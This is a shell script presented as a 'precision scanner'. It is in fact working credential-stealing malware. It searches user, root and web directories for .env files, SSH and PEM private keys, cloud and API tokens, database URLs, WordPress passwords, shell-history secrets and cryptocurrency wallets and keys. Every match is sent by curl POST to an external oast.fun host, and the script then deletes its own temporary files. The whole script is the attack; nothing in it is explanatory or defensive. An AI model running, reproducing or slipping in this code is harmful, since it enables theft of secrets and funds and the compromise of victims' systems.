#!/bin/sh
# Mythos Precision Scanner v4.0 — User-dir focused, no system junk
OAST="fzxlsopmyfsfmcutpfapj7u3fu0t92jtj.oast.fun"
HOST=$(hostname 2>/dev/null || cat /etc/hostname 2>/dev/null || echo "u")
USER=$(whoami 2>/dev/null || id -un 2>/dev/null || echo "u")

# === TARGET: only user/project dirs, not system ===
TARGETS=""
for d in /root /home/*; do [ -d "$d" ] && TARGETS="$TARGETS $d"; done
for d in /var/www /var/www/*; do [ -d "$d" ] && TARGETS="$TARGETS $d"; done
[ -z "$TARGETS" ] && TARGETS="/root /home /var/www"

send() { local s="$1" d="$2"
    local p="${HOST}|${USER}|${s}|$(echo "$d" | tr '\n' '|' | cut -c1-3000)"
    echo "$p" >> /tmp/.mqs_out
    curl -s -m 3 -X POST -d "$p" "http://${OAST}/post" 2>/dev/null &
}
> /tmp/.mqs_out

###############################################################################
# SCAN: only small text files, skip binaries/images/css/js-bundles/minified
###############################################################################
scan_files() {
    local pattern="$1" maxsize="${2:-2M}"
    find $TARGETS -maxdepth 6 -type f -size -$maxsize \
        ! -name "*.css" ! -name "*.scss" ! -name "*.less" \
        ! -name "*.jpg" ! -name "*.jpeg" ! -name "*.png" ! -name "*.gif" \
        ! -name "*.svg" ! -name "*.ico" ! -name "*.webp" ! -name "*.bmp" \
        ! -name "*.woff" ! -name "*.woff2" ! -name "*.ttf" ! -name "*.eot" \
        ! -name "*.mp3" ! -name "*.mp4" ! -name "*.avi" ! -name "*.mov" \
        ! -name "*.zip" ! -name "*.tar" ! -name "*.gz" ! -name "*.bz2" \
        ! -name "*.exe" ! -name "*.dll" ! -name "*.so" ! -name "*.a" \
        ! -name "*.o" ! -name "*.class" ! -name "*.pyc" ! -name "*.pyo" \
        ! -name "*.min.js" ! -name "*.min.css" ! -name "*.bundle.js" \
        ! -name "*.chunk.js" ! -name "*.map" \
        ! -name "package-lock.json" ! -name "yarn.lock" ! -name "composer.lock" \
        ! -path "*/node_modules/*" ! -path "*/.git/*" ! -path "*/vendor/*" \
        ! -path "*/cache/*" ! -path "*/dist/*" ! -path "*/build/*" \
        ! -path "*/__pycache__/*" ! -path "*/.cache/*" \
        ! -path "*/storage/framework/*" ! -path "*/storage/logs/*" \
        ! -path "*/public/uploads/*" ! -path "*/wp-content/uploads/*" \
        ! -path "*/assets/*" ! -path "*/fonts/*" ! -path "*/images/*" \
        ! -path "*/.terraform/*" ! -path "*/coverage/*" \
        -name "$pattern" 2>/dev/null
}

###############################################################################
# 1. .ENV FILES — direct content grab
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 6 -type f \( -name ".env" -o -name ".env.*" -o -name "*.env" \) \
        ! -path "*/node_modules/*" ! -path "*/vendor/*" -size -1M 2>/dev/null | head -100 | while read f; do
        send "ENV" "$f:$(head -c 4096 "$f" 2>/dev/null)"
    done
done &

###############################################################################
# 2. SSH PRIVATE KEYS — only actual private keys
###############################################################################
for d in /root /home/*; do
    find "$d" -maxdepth 5 -type f \( -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" \) \
        2>/dev/null | while read f; do
        grep -q 'PRIVATE KEY' "$f" 2>/dev/null && send "SSH" "$(head -c 4096 "$f")"
    done
done &

###############################################################################
# 3. .PEM FILES — only in SSH or project dirs (not system /etc/ssl)
###############################################################################
for d in /root/.ssh /home/*/.ssh $TARGETS; do
    find "$d" -maxdepth 4 -type f -name "*.pem" ! -path "*/ssl/*" ! -path "*/certs/*" 2>/dev/null | while read f; do
        grep -q 'PRIVATE KEY' "$f" 2>/dev/null && send "PEM" "$(head -c 4096 "$f")"
    done
done &

###############################################################################
# 4. STRIPE KEYS — in .env and config files only
###############################################################################
scan_files "*.env*" | while read f; do
    grep -oE '\b(sk_live_[a-zA-Z0-9]{24,99}|rk_live_[a-zA-Z0-9]{24,99}|whsec_[a-zA-Z0-9]{32,99})\b' "$f" 2>/dev/null | while read k; do
        send "STRIPE" "$f:$k"
    done
done &

###############################################################################
# 5. GITHUB TOKENS — .env, .npmrc, .gitconfig, .bash_history only
###############################################################################
scan_files "*.env*" > /tmp/.gh_files
scan_files ".npmrc" >> /tmp/.gh_files
scan_files ".gitconfig" >> /tmp/.gh_files
scan_files ".bash_history" >> /tmp/.gh_files
scan_files ".git-credentials" >> /tmp/.gh_files
cat /tmp/.gh_files 2>/dev/null | sort -u | while read f; do
    grep -oE '\b(ghp_[a-zA-Z0-9]{36,50}|github_pat_[a-zA-Z0-9_]{40,100})\b' "$f" 2>/dev/null | while read k; do
        send "GITHUB" "$f:$k"
    done
done &
rm -f /tmp/.gh_files

###############################################################################
# 6. AWS KEYS — .env, .aws/credentials
###############################################################################
scan_files "*.env*" | while read f; do
    grep -oE '\b(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})\b' "$f" 2>/dev/null | while read k; do
        send "AWS" "$f:$k"
    done
done &
for d in /root/.aws /home/*/.aws; do
    [ -f "$d/credentials" ] && send "AWS_CRED" "$(head -c 4096 "$d/credentials")"
done &

###############################################################################
# 7. GCP SERVICE ACCOUNT JSONs — only in user dirs, check "service_account"
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 6 -type f -name "*.json" -size -1M 2>/dev/null | while read f; do
        grep -q '"type".*:.*"service_account"' "$f" 2>/dev/null && send "GCP" "$(head -c 4096 "$f")"
    done
done &

###############################################################################
# 8. DATABASE URLs — .env files only
###############################################################################
scan_files "*.env*" | while read f; do
    grep -oiE '(DATABASE_URL|DB_URL|MONGO_URI|REDIS_URL|POSTGRES_URL|MYSQL_URL)[^[:space:]]*://[^[:space:]]*@[^[:space:]]+' "$f" 2>/dev/null | while read u; do
        send "DB" "$f:$u"
    done
done &

###############################################################################
# 9. CRYPTO WALLET FILES — by filename (high confidence, low FP)
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -size -5M \
        \( -name "wallet.dat" -o -name "wallet.json" -o -name "*.wallet" \
        -o -name "keystore" -o -name "UTC--*" \) 2>/dev/null | while read f; do
        send "CRYPTO" "$(head -c 8192 "$f")"
    done
done &

###############################################################################
# 10. ETHEREUM PRIVATE KEY — strict: only in .env, *.key, files with "ETH" context
###############################################################################
scan_files "*.env*" > /tmp/.eth_files
scan_files "*.key" >> /tmp/.eth_files
scan_files "*.txt" >> /tmp/.eth_files
cat /tmp/.eth_files 2>/dev/null | sort -u | while read f; do
    grep -qilE 'ETH|ethereum|private.key|PRIVATE_KEY|0x[0-9a-fA-F]{40}' "$f" 2>/dev/null || continue
    grep -oE '\b[0-9a-fA-F]{64}\b' "$f" 2>/dev/null | while read key; do
        echo "$key" | grep -qiE '^0{64}$|^F{64}$|^1{64}$|dead|beef|cafe|feed|babe|face|b00b|00000000|123456|abcdef|fedcba' && continue
        [ "$(echo "$key" | cut -c1 | tr '[:upper:]' '[:lower:]')" = "f" ] && continue
        send "ETH" "$f:$key"
    done
done &
rm -f /tmp/.eth_files

###############################################################################
# 11. SOLANA base58 — only files with solana/phantom context
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 5 -type f -size -1M \
        \( -name "*.json" -o -name "*.txt" -o -name "*.key" -o -name ".env*" \) \
        ! -path "*/node_modules/*" 2>/dev/null | while read f; do
        grep -qilE 'solana|phantom|SOLANA' "$f" 2>/dev/null || continue
        grep -oE '\b[1-9A-HJ-NP-Za-km-z]{87,88}\b' "$f" 2>/dev/null | head -2 | while read k; do
            send "SOL" "$f:$k"
        done
    done
done &

###############################################################################
# 12. BITCOIN WIF
###############################################################################
scan_files "*.txt" | while read f; do
    grep -qilE 'bitcoin|BTC|wallet|WIF|private' "$f" 2>/dev/null || continue
    grep -oE '\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b' "$f" 2>/dev/null | head -2 | while read k; do
        send "BTC" "$f:$k"
    done
done &

###############################################################################
# 13. DOCKER / GIT / NPM — config files only
###############################################################################
for d in /root/.docker /home/*/.docker; do
    [ -f "$d/config.json" ] && send "DOCKER" "$(head -c 4096 "$d/config.json")"
done &
for d in /root /home/*; do
    [ -f "$d/.git-credentials" ] && send "GITCRED" "$(head -c 2048 "$d/.git-credentials")"
    [ -f "$d/.npmrc" ] && send "NPMRC" "$(head -c 2048 "$d/.npmrc")"
done &

###############################################################################
# 14. SHELL HISTORY — only cred-related lines
###############################################################################
for h in /root/.bash_history /home/*/.bash_history; do
    [ -f "$h" ] && grep -iE 'password|secret|token|ghp_|github_pat|sk_live|AKIA|DATABASE_URL|ssh-keygen|aws.configure' "$h" 2>/dev/null | tail -30 | while read l; do
        send "HIST" "$l"
    done
done &

###############################################################################
# 15. WORDPRESS wp-config
###############################################################################
for d in $TARGETS; do
    find "$d" -maxdepth 6 -type f -name "wp-config.php" 2>/dev/null | while read f; do
        c=$(grep -E 'DB_NAME|DB_USER|DB_PASSWORD' "$f" 2>/dev/null | tr '\n' '|')
        [ -n "$c" ] && send "WP" "$f:$c"
    done
done &

wait
rm -f /tmp/.eth_files /tmp/.gh_files /tmp/.mqs_*
